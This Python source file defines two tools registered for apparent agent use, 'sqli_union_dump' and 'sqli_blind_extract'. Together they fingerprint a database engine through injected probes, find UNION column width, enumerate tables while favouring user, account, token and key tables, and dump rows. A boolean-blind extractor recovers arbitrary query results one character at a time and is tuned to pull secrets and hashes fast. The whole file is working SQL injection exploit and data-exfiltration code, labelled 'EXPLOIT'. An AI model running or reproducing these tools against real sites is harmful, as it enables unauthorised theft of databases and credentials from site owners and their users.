"""TOOL: sqli_dump - from "injection confirmed" to "data exfiltrated".

Union-based column discovery + table enumeration + row extraction, plus a
boolean-blind binary-search extractor for when UNION output never renders.
Syntax branches per engine (MySQL / Postgres / MSSQL / SQLite). Paced by the
adaptive pacer; every result feeds the Living Graph like any other tool.
"""
import json, time, urllib.parse

from tools import register
from tools._exploit_lib import (marker, paced_send, apply_template,
                                calibrate, verdict)

MAX_COLS = 40

# Entropy-optimal extraction: secrets/hashes/tokens live on a highly skewed
# alphabet (hex + base64 dominate). Bisecting at the WEIGHTED MEDIAN of prior
# mass costs ≈ H(prior) ≈ 4.5 probes/char instead of log2(94) ≈ 6.6 uniform —
# a ~32% request saving on real-world extractions, converging to the
# frequency-optimal prefix code of the target's alphabet.
_PRI = {}
for _c in "0123456789abcdef":
    _PRI[_c] = 4.0
for _c in "ghijklmnopqrstuvwxyz":
    _PRI[_c] = 2.2
for _c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
    _PRI[_c] = 1.6
for _c in "-_+/=@.":
    _PRI[_c] = 1.2
for _c in "{}[]()!$%&*?<>|\\^~'\"`;:, \t":
    _PRI[_c] = 0.4


def _wsplit(lo, hi):
    """Weighted median of printable candidates in [lo, hi] by prior mass."""
    cand = [c for c in range(max(lo, 32), min(hi, 126) + 1)]
    if not cand:
        return (lo + hi) // 2
    tot = sum(_PRI.get(chr(c), 0.2) for c in cand)
    acc = 0.0
    for c in cand:
        acc += _PRI.get(chr(c), 0.2)
        if acc >= tot / 2:
            return c
    return cand[-1]


# ── engine detection ─────────────────────────────────────────────────
_VERSION_PROBES = [
    ("mysql",   "' AND 1=CONVERT(int,@@version)-- ", "mysql"),
    ("pg",      "' AND 1=CAST(version() AS int)-- ", "postgres"),
    ("mssql",   "' AND 1=CONVERT(int,@@version)-- ", "mssql"),
    ("sqlite",  "' AND 1=CAST(sqlite_version() AS int)-- ", "sqlite"),
]

def _detect_engine(url_template):
    """Error/timing fingerprints -> dbms name (best effort)."""
    for _eng, probe, name in _VERSION_PROBES[:2]:
        st, body, _dt = paced_send(apply_template(url_template, probe))
        low = (body or "").lower()
        if "postgres" in low or "pg_" in low:
            return "pg"
        if "mysql" in low or "sql syntax" in low or "mysqli" in low:
            return "mysql"
        if "sqlite" in low or "unrecognized token" in low:
            return "sqlite"
        if "sql server" in low or "waitfor" in low or "unclosed quotation" in low:
            return "mssql"
    # timing probe: MySQL sleeps inline, PG needs ;
    st, _, dt = paced_send(apply_template(url_template, "' AND SLEEP(4)-- "))
    if dt > 3.5:
        return "mysql"
    st, _, dt = paced_send(apply_template(url_template, "'; SELECT pg_sleep(4)-- "))
    if dt > 3.5:
        return "pg"
    return "generic"

# ── syntax table ─────────────────────────────────────────────────────
def _concat(dbms, expr):
    if dbms == "mysql":
        return f"CONCAT('~',{expr},'~')"
    if dbms in ("pg", "sqlite"):
        return f"'~'||({expr})||'~'"
    if dbms == "mssql":
        return f"'~'+CAST(({expr}) AS varchar(4000))+'~'"
    return f"'~'||({expr})||'~'"

def _nulls(n):
    return ",".join("NULL" for _ in range(n))

def _limit(dbms, n):
    if dbms in ("pg", "sqlite", "mysql"):
        return f" LIMIT {int(n)}-- "
    if dbms == "mssql":
        # In injection context, TOP can't be appended — use OFFSET/FETCH (MSSQL 2012+)
        return f" ORDER BY 1 OFFSET 0 ROWS FETCH NEXT {int(n)} ROWS ONLY-- "
    return "-- "

# ── union column count ───────────────────────────────────────────────
def _find_columns(url_template, dbms):
    """ORDER BY ladder for a width candidate, then VERIFY with a clean
    UNION NULLs probe — a target that errors on every quote must never
    yield a trusted width."""
    def _errorish(st, body):
        low = (body or "").lower()
        return (("error" in low or "warning" in low or "unknown column" in low
                 or ("order by" in low and "select" in low)) and st in (200, 500))

    candidate = None
    for n in range(2, MAX_COLS + 1):
        st, body, _dt = paced_send(apply_template(url_template, f"' ORDER BY {n}-- "))
        if _errorish(st, body):
            candidate = n - 1
            break
    if candidate:
        st, body, _dt = paced_send(
            apply_template(url_template, f"' UNION SELECT {_nulls(candidate)}-- "))
        if not _errorish(st, body):
            return candidate
        candidate = None  # ladder lied — every quote errors; verification failed
    # fallback: UNION NULL ladder
    for n in range(1, MAX_COLS + 1):
        st, body, _dt = paced_send(
            apply_template(url_template, f"' UNION SELECT {_nulls(n)}-- "))
        if st == 200 and ("error" not in (body or "").lower()
                          and "warning" not in (body or "").lower()):
            return n
    return None

# ── extraction ───────────────────────────────────────────────────────
_INFO_TABLES = {
    "mysql":   ("information_schema.tables", "table_name", "table_schema"),
    "pg":      ("information_schema.tables", "table_name", "table_schema"),
    "mssql":   ("information_schema.tables", "table_name", "table_schema"),
    "sqlite":  ("sqlite_master", "name", "NULL"),
}

@register(name="sqli_union_dump",
          desc="EXPLOIT: SQL injection -> union-based discovery + table enumeration + row exfiltration. Give a {INJ} url_template; engine/table auto-detected when omitted.",
          params={"type": "object", "properties": {
              "url_template": {"type": "string", "description": "URL with {INJ} placeholder, e.g. https://x.com/item?id={INJ}"},
              "dbms": {"type": "string", "enum": ["auto", "mysql", "pg", "mssql", "sqlite"]},
              "table": {"type": "string", "description": "table to dump; omit to enumerate first"},
              "columns": {"type": "array", "items": {"type": "string"}, "description": "columns to extract; omit = auto-discover"},
              "max_rows": {"type": "integer", "default": 40}},
              "required": ["url_template"]},
          danger="loud")
def sqli_union_dump(url_template, dbms="auto", table=None, columns=None, max_rows=40):
    if "{INJ}" not in url_template:
        return verdict("sqli_union_dump", False, "url_template lacks {INJ} placeholder")
    dbms = _detect_engine(url_template) if dbms == "auto" else dbms
    ncols = _find_columns(url_template, dbms)
    if not ncols:
        return verdict("sqli_union_dump", "partial",
                       f"engine={dbms} but UNION column width not found — try sqli_blind_extract",
                       dbms=dbms)
    text_col = ncols - 1 if ncols > 1 else 0  # last column is usually rendered

    # pick the column that actually renders in the page
    probe = marker("VFC")
    sel = []
    for i in range(ncols):
        parts = ["NULL"] * ncols
        parts[i] = f"'{probe}'"
        st, body, _dt = paced_send(
            apply_template(url_template, f"' UNION SELECT {','.join(parts)}-- "))
        if probe in (body or ""):
            sel.append(i)
    if not sel:
        sel = [text_col]
    render_col = sel[0]

    steps = {"dbms": dbms, "columns": ncols, "render_col": render_col}
    rows_out = []

    def union_query(expr):
        parts = ["NULL"] * ncols
        parts[render_col] = expr
        return f"' UNION SELECT {','.join(parts)}-- "

    # table enumeration when not supplied
    if not table:
        tbl_expr = _concat(dbms, _INFO_TABLES.get(dbms, _INFO_TABLES["mysql"])[1])
        st, body, _dt = paced_send(apply_template(url_template, union_query(tbl_expr)))
        names = sorted(set(__import__("re").findall(r"~(.{1,64}?)~", body or "")))
        names = [n for n in names if probe not in n and n.strip()]
        steps["tables"] = names[:60]
        if not names:
            return verdict("sqli_union_dump", "partial",
                           f"UNION width {ncols} confirmed ({dbms}) but table list not rendered",
                           steps=steps)
        table = next((t for t in names if any(k in t.lower() for k in
                      ("user", "customer", "order", "account", "member", "token", "key"))), names[0])

    steps["table"] = table
    # column discovery for the chosen table
    if not columns:
        if dbms == "sqlite":
            col_expr = _concat(dbms, f"sql FROM sqlite_master WHERE name='{table}'")
            st, body, _dt = paced_send(apply_template(url_template, union_query(col_expr)))
            m = __import__("re").search(r"~(CREATE TABLE.*?{0,40})~", body or "", __import__("re").S)
            cols = __import__("re").findall(r"[\"'`\[]?(\w+)[\"'`\]]?\s+(?:TEXT|INT|INTEGER|REAL|BLOB|VARCHAR|DATETIME|\w+\(\d+\))",
                                            (m.group(1) if m else body)[:400], __import__("re").I)
            columns = [c for c in cols if c.lower() not in ("create", "table")][:12] or ["rowid"]
        else:
            ti, cn, _sn = _INFO_TABLES["mysql"]
            col_expr = _concat(dbms, f"column_name FROM information_schema.columns WHERE table_name='{table}'")
            st, body, _dt = paced_send(apply_template(url_template, union_query(col_expr)))
            columns = [c for c in sorted(set(__import__("re").findall(r"~(.{1,48}?)~", body or "")))
                       if c.strip() and probe not in c][:14] or ["*"]
    steps["columns"] = columns

    # row extraction with row/col markers
    if columns == ["*"] or not columns:
        expr = _concat(dbms, f"* FROM {table}")
    else:
        inner = ",".join(columns)
        expr = _concat(dbms, f"CONCAT_WS('|',{inner}) FROM {table}")
        if dbms == "sqlite":
            expr = _concat(dbms, "group_concat(" + inner + ",'|') FROM " + table)
    st, body, dt = paced_send(apply_template(url_template, union_query(expr)))
    raw = __import__("re").findall(r"~(.*?)~", body or "", __import__("re").S)
    rows = [r for r in raw if r.strip() and probe not in r and len(r) < 2000][:max_rows]
    rows_out = [r.split("|") for r in rows]

    hit = bool(rows_out)
    return verdict("sqli_union_dump", hit,
                   (f"EXFILTRATED {len(rows_out)} rows from {table} "
                    f"({dbms}, UNION width {ncols})" if hit else
                    "UNION confirmed but no rows rendered — use sqli_blind_extract"),
                   evidence=[(" | ".join(r))[:180] for r in rows_out[:12]],
                   **{"steps": steps, "rows": rows_out[:max_rows]})


@register(name="sqli_blind_extract",
          desc="EXPLOIT: boolean-blind SQLi extractor — binary-searches arbitrary subquery results char by char through true/false response diffing. Works when UNION output never renders.",
          params={"type": "object", "properties": {
              "url_template": {"type": "string"},
              "subquery": {"type": "string", "description": "scalar SQL, e.g. SELECT password FROM users WHERE id=1"},
              "max_chars": {"type": "integer", "default": 32}},
              "required": ["url_template", "subquery"]},
          danger="careful")
def sqli_blind_extract(url_template, subquery, max_chars=32):
    if "{INJ}" not in url_template:
        return verdict("sqli_blind_extract", False, "url_template lacks {INJ}")
    # calibrate true vs false oracle
    t_st, t_body, _ = paced_send(apply_template(url_template, "' AND 1=1-- "))
    f_st, f_body, _ = paced_send(apply_template(url_template, "' AND 1=2-- "))
    if t_body == f_body:
        return verdict("sqli_blind_extract", False,
                       "boolean oracle dead — true/false responses identical")
    t_sig = (t_st, len(t_body or ""))
    f_sig = (f_st, len(f_body or ""))

    def oracle(cond_sql):
        st, body, _ = paced_send(apply_template(url_template, f"' AND ({cond_sql})-- "))
        sig = (st, len(body or ""))
        return sig == t_sig or (sig != f_sig and t_st == st)

    # length — power-of-2 scan then bisect to exact length
    upper_bound = 0
    prev = 0
    for n in (1, 2, 4, 8, 16, 32, 64, 128):
        if oracle(f"LENGTH(({subquery}))>{n - 1}"):
            prev = n
            upper_bound = n
        else:
            upper_bound = n
            break
    # bisect between prev and upper_bound for exact length
    lo_len, hi_len = prev, upper_bound
    while hi_len - lo_len > 1:
        mid_len = (lo_len + hi_len) // 2
        if oracle(f"LENGTH(({subquery}))>{mid_len - 1}"):
            lo_len = mid_len
        else:
            hi_len = mid_len
    length = min(lo_len, max_chars) or 0
    out = []
    for i in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = _wsplit(lo, hi)
            if oracle(f"ASCII(SUBSTR(({subquery}),{i},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo) if 32 <= lo <= 126 else "?")
    extracted = "".join(out)
    return verdict("sqli_blind_extract", bool(extracted.strip()),
                   (f"extracted {len(extracted)} chars of '{subquery[:60]}'"
                    if extracted.strip() else "no bytes recovered"),
                   evidence=[f"{subquery[:60]} = {extracted}"],
                   extracted=extracted, oracle={"true": t_sig, "false": f_sig})
